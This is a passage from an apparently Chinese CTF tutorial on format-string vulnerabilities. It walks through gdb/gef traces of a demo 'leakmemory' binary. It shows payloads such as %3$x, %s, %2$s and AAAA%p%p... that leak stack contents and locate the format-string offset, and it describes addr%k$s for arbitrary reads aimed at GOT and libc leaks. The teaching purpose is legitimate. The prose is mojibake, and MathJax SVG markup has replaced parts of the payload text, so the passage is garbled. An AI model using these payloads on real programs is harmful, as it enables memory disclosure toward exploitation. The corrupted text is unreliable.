ax, ax<br> â†’ 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   â†³  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ stack ]â”€â”€â”€â”€<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccecâ”‚+0x00: 0x080484bf  â†’  &lt;main+84&gt; add esp, 0x20	 â† $esp<br>0xffffccf0â”‚+0x04: 0x08048563  â†’  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4â”‚+0x08: 0x00000001<br>0xffffccf8â”‚+0x0c: 0x22222222<br>0xffffccfcâ”‚+0x10: 0xffffffff<br>0xffffcd00â”‚+0x14: 0xffffcd10  â†’  &quot;%3$x&quot;<br>0xffffcd04â”‚+0x18: 0xffffcd10  â†’  &quot;%3$x&quot;<br>0xffffcd08â”‚+0x1c: 0x000000c2<br>gefâ¤  c<br>Continuing.<br>00000001.22222222.ffffffff.%3$x<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%3$x&quot;) at printf.c:28<br>28	in printf.c<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ code:i386 ]â”€â”€â”€â”€<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> â†’ 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   â†³  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ stack ]â”€â”€â”€â”€<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfcâ”‚+0x00: 0x080484ce  â†’  &lt;main+99&gt; add esp, 0x10	 â† $esp<br>0xffffcd00â”‚+0x04: 0xffffcd10  â†’  &quot;%3$x&quot;<br>0xffffcd04â”‚+0x08: 0xffffcd10  â†’  &quot;%3$x&quot;<br>0xffffcd08â”‚+0x0c: 0x000000c2<br>0xffffcd0câ”‚+0x10: 0xf7e8b6bb  â†’  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10â”‚+0x14: &quot;%3<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.461ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 2351.3 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">x"	 â† </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2190" d="M944 261T944 250T929 230H165Q167 228 182 216T211 189T244 152T277 96T303 25Q308 7 308 0Q308 -11 288 -11Q281 -11 278 -11T272 -7T267 2T263 21Q245 94 195 151T73 236Q58 242 55 247Q55 254 59 257T73 264Q121 283 158 314T215 375T247 434T264 480L267 497Q269 503 270 505T275 509T288 511Q308 511 308 500Q308 493 303 475Q293 438 278 406T246 352T215 315T185 287T165 270H929Q944 261 944 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-78" x="0" y="0"/>
<g transform="translate(850,0)">
 <use xlink:href="#E1-MJMAIN-22"/>
 <use xlink:href="#E1-MJMAIN-2190" x="500" y="0"/>
</g>
</g>
</svg>eax<br>0xffffcd14â”‚+0x18: 0xffffce00  â†’  0x00000001<br>0xffffcd18â”‚+0x1c: 0x000000e0<br>gefâ¤  c<br>Continuing.<br>f7e8b6bb[Inferior 1 (process 57442) exited normally]<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬ç¡®å®è·å¾—äº†printfçš„ç¬¬4ä¸ªå‚æ•°æ‰€å¯¹åº”çš„å€¼f7e8b6bbã€‚</p>
<h4 id="è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²"><a href="#è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²" class="headerlink" title="è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²"></a>è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²</h4><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è·å¾—æ ˆå˜é‡å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œè¿™å…¶å®å°±æ˜¯éœ€è¦ç”¨åˆ°%säº†ã€‚è¿™é‡Œè¿˜æ˜¯ä½¿ç”¨ä¸Šé¢çš„ç¨‹åºï¼Œè¿›è¡Œgdbè°ƒè¯•ï¼Œå¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">âœ  leakmemory git:(master) âœ— gdb leakmemory<br>gefâ¤  b printf<br>Breakpoint 1 at 0x8048330<br>gefâ¤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">s</span><br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•.<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ code:i386 ]â”€â”€â”€â”€<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> â†’ 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   â†³  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ stack ]â”€â”€â”€â”€<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccecâ”‚+0x00: 0x080484bf  â†’  &lt;main+84&gt; add esp, 0x20	 â† $esp<br>0xffffccf0â”‚+0x04: 0x08048563  â†’  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4â”‚+0x08: 0x00000001<br>0xffffccf8â”‚+0x0c: 0x22222222<br>0xffffccfcâ”‚+0x10: 0xffffffff<br>0xffffcd00â”‚+0x14: 0xffffcd10  â†’  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04â”‚+0x18: 0xffffcd10  â†’  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08â”‚+0x1c: 0x000000c2<br>gefâ¤  c<br>Continuing.<br>00000001.22222222.ffffffff.%s<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28	in printf.c<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ code:i386 ]â”€â”€â”€â”€<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> â†’ 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   â†³  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ stack ]â”€â”€â”€â”€<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfcâ”‚+0x00: 0x080484ce  â†’  &lt;main+99&gt; add esp, 0x10	 â† $esp<br>0xffffcd00â”‚+0x04: 0xffffcd10  â†’  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04â”‚+0x08: 0xffffcd10  â†’  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08â”‚+0x0c: 0x000000c2<br>0xffffcd0câ”‚+0x10: 0xf7e8b6bb  â†’  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10â”‚+0x14: 0xff007325 (&quot;%s&quot;?)	 â† $eax<br>0xffffcd14â”‚+0x18: 0xffffce3c  â†’  0xffffd074  â†’  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18â”‚+0x1c: 0x000000e0<br>gefâ¤  c<br>Continuing.<br><span class="hljs-meta">%</span><span class="bash">s[Inferior 1 (process 57488) exited normally]</span><br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºï¼Œåœ¨ç¬¬äºŒæ¬¡æ‰§è¡Œprintfå‡½æ•°çš„æ—¶å€™ï¼Œç¡®å®æ˜¯å°†0xffffcd04å¤„çš„å˜é‡è§†ä¸ºå­—ç¬¦ä¸²å˜é‡ï¼Œè¾“å‡ºäº†å…¶æ•°å€¼æ‰€å¯¹åº”çš„åœ°å€å¤„çš„å­—ç¬¦ä¸²ã€‚</p>
<p><strong>å½“ç„¶ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰è¿™æ ·çš„éƒ½ä¼šæ­£å¸¸è¿è¡Œï¼Œå¦‚æœå¯¹åº”çš„å˜é‡ä¸èƒ½å¤Ÿè¢«è§£æä¸ºå­—ç¬¦ä¸²åœ°å€ï¼Œé‚£ä¹ˆï¼Œç¨‹åºå°±ä¼šç›´æ¥å´©æºƒã€‚</strong></p>
<p>æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‡å®šè·å–æ ˆä¸Šç¬¬å‡ ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å‡ºï¼Œæ¯”å¦‚æˆ‘ä»¬æŒ‡å®šç¬¬printfçš„ç¬¬3ä¸ªå‚æ•°ï¼Œå¦‚ä¸‹ï¼Œæ­¤æ—¶ç¨‹åºå°±ä¸èƒ½å¤Ÿè§£æï¼Œå°±å´©æºƒäº†ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">âœ  leakmemory git:(master) âœ— ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">2<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%2$s<br>[1]    57534 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure>

<p><strong>å°æŠ€å·§æ€»ç»“</strong></p>
<blockquote>
<ol>
<li>åˆ©ç”¨%xæ¥è·å–å¯¹åº”æ ˆçš„å†…å­˜ï¼Œä½†å»ºè®®ä½¿ç”¨%pï¼Œå¯ä»¥ä¸ç”¨è€ƒè™‘ä½æ•°çš„åŒºåˆ«ã€‚</li>
<li>åˆ©ç”¨%sæ¥è·å–å˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œåªä¸è¿‡æœ‰é›¶æˆªæ–­ã€‚</li>
<li>åˆ©ç”¨%order\<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="27.33ex" height="3.343ex" style="vertical-align: -1.171ex;" viewbox="0 -934.9 11766.9 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">xæ¥è·å–æŒ‡å®šå‚æ•°çš„å€¼ï¼Œåˆ©ç”¨%order\</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-78" x="0" y="0"/>
<g transform="translate(572,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">æ¥</text>
</g>
<g transform="translate(1505,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">è·</text>
</g>
<g transform="translate(2438,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">å–</text>
</g>
<g transform="translate(3371,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">æŒ‡</text>
</g>
<g transform="translate(4303,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">å®š</text>
</g>
<g transform="translate(5236,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">å‚</text>
</g>
<g transform="translate(6169,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">æ•°</text>
</g>
<g transform="translate(7102,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">çš„</text>
</g>
<g transform="translate(8035,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">å€¼</text>
</g>
<g transform="translate(8968,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">ï¼Œ</text>
</g>
<g transform="translate(9901,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">åˆ©</text>
</g>
<g transform="translate(10834,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">ç”¨</text>
</g>
</g>
</svg>sæ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”åœ°å€çš„å†…å®¹ã€‚</li>
</ol>
</blockquote>
<h3 id="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"><a href="#æ³„éœ²ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"></a>æ³„éœ²ä»»æ„åœ°å€å†…å­˜</h3><p>å¯ä»¥çœ‹å‡ºï¼Œåœ¨ä¸Šé¢æ— è®ºæ˜¯æ³„éœ²æ ˆä¸Šè¿ç»­çš„å˜é‡ï¼Œè¿˜æ˜¯è¯´æ³„éœ²æŒ‡å®šçš„å˜é‡å€¼ï¼Œæˆ‘ä»¬éƒ½æ²¡èƒ½å®Œå…¨æ§åˆ¶æˆ‘ä»¬æ‰€è¦æ³„éœ²çš„å˜é‡çš„åœ°å€ã€‚è¿™æ ·çš„æ³„éœ²å›ºç„¶æœ‰ç”¨ï¼Œå¯æ˜¯å´ä¸å¤Ÿå¼ºåŠ›æœ‰æ•ˆã€‚æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šæƒ³è¦æ³„éœ²æŸä¸€ä¸ªlibcå‡½æ•°çš„gotè¡¨å†…å®¹ï¼Œä»è€Œå¾—åˆ°å…¶åœ°å€ï¼Œè¿›è€Œè·å–libcç‰ˆæœ¬ä»¥åŠå…¶ä»–å‡½æ•°çš„åœ°å€ï¼Œè¿™æ—¶å€™ï¼Œèƒ½å¤Ÿå®Œå…¨æ§åˆ¶æ³„éœ²æŸä¸ªæŒ‡å®šåœ°å€çš„å†…å­˜å°±æ˜¾å¾—å¾ˆé‡è¦äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬ç©¶ç«Ÿèƒ½ä¸èƒ½è¿™æ ·åšå‘¢ï¼Ÿè‡ªç„¶ä¹Ÿæ˜¯å¯ä»¥çš„å•¦ã€‚</p>
<p>æˆ‘ä»¬å†ä»”ç»†å›æƒ³ä¸€ä¸‹ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸­ï¼Œæˆ‘ä»¬æ‰€è¯»å–çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯åœ¨æ ˆä¸Šçš„ï¼ˆå› ä¸ºæ˜¯æŸä¸ªå‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œæœ¬ä¾‹ä¸­sæ˜¯mainå‡½æ•°çš„å±€éƒ¨å˜é‡ï¼‰ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è°ƒç”¨è¾“å‡ºå‡½æ•°çš„æ—¶å€™ï¼Œå…¶å®ï¼Œç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼å…¶å®å°±æ˜¯è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ã€‚æˆ‘ä»¬é€‰æ‹©ä¸Šé¢çš„æŸä¸ªå‡½æ•°è°ƒç”¨ä¸ºä¾‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28	in printf.c<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ code:i386 ]â”€â”€â”€â”€<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> â†’ 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   â†³  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ stack ]â”€â”€â”€â”€<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfcâ”‚+0x00: 0x080484ce  â†’  &lt;main+99&gt; add esp, 0x10	 â† $esp<br>0xffffcd00â”‚+0x04: 0xffffcd10  â†’  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04â”‚+0x08: 0xffffcd10  â†’  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08â”‚+0x0c: 0x000000c2<br>0xffffcd0câ”‚+0x10: 0xf7e8b6bb  â†’  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10â”‚+0x14: 0xff007325 (&quot;%s&quot;?)	 â† $eax<br>0xffffcd14â”‚+0x18: 0xffffce3c  â†’  0xffffd074  â†’  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18â”‚+0x1c: 0x000000e0<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºåœ¨æ ˆä¸Šçš„ç¬¬äºŒä¸ªå˜é‡å°±æ˜¯æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€0xffffcd10ï¼ŒåŒæ—¶è¯¥åœ°å€å­˜å‚¨çš„ä¹Ÿç¡®å®æ˜¯â€%sâ€æ ¼å¼åŒ–å­—ç¬¦ä¸²å†…å®¹ã€‚</p>
<p>é‚£ä¹ˆç”±äºæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨è¾“å‡ºå‡½æ•°è°ƒç”¨æ—¶æ˜¯ç¬¬å‡ ä¸ªå‚æ•°ï¼Œè¿™é‡Œå‡è®¾è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›¸å¯¹å‡½æ•°è°ƒç”¨ä¸ºç¬¬kä¸ªå‚æ•°ã€‚é‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„æ–¹å¼æ¥è·å–æŸä¸ªæŒ‡å®šåœ°å€addrçš„å†…å®¹ã€‚</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><code class="hljs cos">addr<span class="hljs-built_in">%k</span><span class="hljs-built_in">$s</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>æ³¨ï¼š åœ¨è¿™é‡Œï¼Œå¦‚æœæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸€å®šç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç›¸å¯¹åç§»ï¼Œè¿™æ˜¯å› ä¸ºåœ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™æ ˆæŒ‡é’ˆè‡³å°‘ä½äºæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€8å­—èŠ‚æˆ–è€…16å­—èŠ‚ã€‚</p>
</blockquote>
<p>ä¸‹é¢å°±æ˜¯å¦‚ä½•ç¡®å®šè¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸ºç¬¬å‡ ä¸ªå‚æ•°çš„é—®é¢˜äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼ç¡®å®š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[tag]%p%p%p%p%p%p...<br></code></pre></td></tr></table></figure>

<p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¼šé‡å¤æŸä¸ªå­—ç¬¦çš„æœºå™¨å­—é•¿æ¥ä½œä¸ºtagï¼Œè€Œåé¢ä¼šè·Ÿä¸Šè‹¥å¹²ä¸ª%pæ¥è¾“å‡ºæ ˆä¸Šçš„å†…å®¹ï¼Œå¦‚æœå†…å®¹ä¸æˆ‘ä»¬å‰é¢çš„tagé‡å¤äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æœ‰å¾ˆå¤§æŠŠæ¡è¯´æ˜è¯¥åœ°å€å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ï¼Œä¹‹æ‰€ä»¥è¯´æ˜¯æœ‰å¾ˆå¤§æŠŠæ¡ï¼Œè¿™æ˜¯å› ä¸ºä¸æ’é™¤æ ˆä¸Šæœ‰ä¸€äº›ä¸´æ—¶å˜é‡ä¹Ÿæ˜¯è¯¥æ•°å€¼ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæå…¶å°‘è§ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ›´æ¢å…¶ä»–å­—ç¬¦è¿›è¡Œå°è¯•ï¼Œè¿›è¡Œå†æ¬¡ç¡®è®¤ã€‚è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨å­—ç¬¦â€™Aâ€™ä½œä¸ºç‰¹å®šå­—ç¬¦ï¼ŒåŒæ—¶è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰ç¼–è¯‘å¥½çš„ç¨‹åºï¼Œå¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">âœ  leakmemory git:(master) âœ— ./leakmemory<br><span class="hljs-meta">AAAA%</span><span class="bash">p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br>00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p<br><span class="hljs-meta">AAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%</span><br></code></pre></td></tr></table></figure>

